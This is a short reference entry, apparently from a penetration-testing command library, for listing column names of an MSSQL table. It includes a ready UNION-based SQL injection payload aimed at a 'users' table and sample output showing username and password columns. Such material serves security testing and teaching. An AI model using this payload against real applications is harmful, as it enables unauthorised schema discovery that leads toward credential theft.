---
type: command
executor: sql
data: >-
  SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name =
  '$_TABLE_NAME');
tags:
  - sql-injection
  - mssql
  - discovery
platforms:
  - MSSQL
verified: true
validated: true
---

# mssql-list-column-names-for-table

## Command

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '$_TABLE_NAME');
```

## Description

This SQL command queries the syscolumns and sysobjects system tables in an MSSQL database to list the names of columns in a specified table within the current database. It is typically injected via a SQL injection vulnerability to perform database schema discovery during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TABLE_NAME | The name of the target table to enumerate columns for (e.g., 'users') | Yes |

## Examples

### Basic Usage

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
```

### In SQLi Payload

```sql
' UNION SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') --
```

## Expected Output

A list of column names for the specified table, such as:

```
name
----
id
username
password
email
```

If injected successfully, these may appear in the application's response or error output, confirming schema details.

## Related

- [[procedures/List-MSSQL-Table-Columns-via-SQL-Injection]]
- [[commands/mssql-list-column-names-and-types-for-table]]
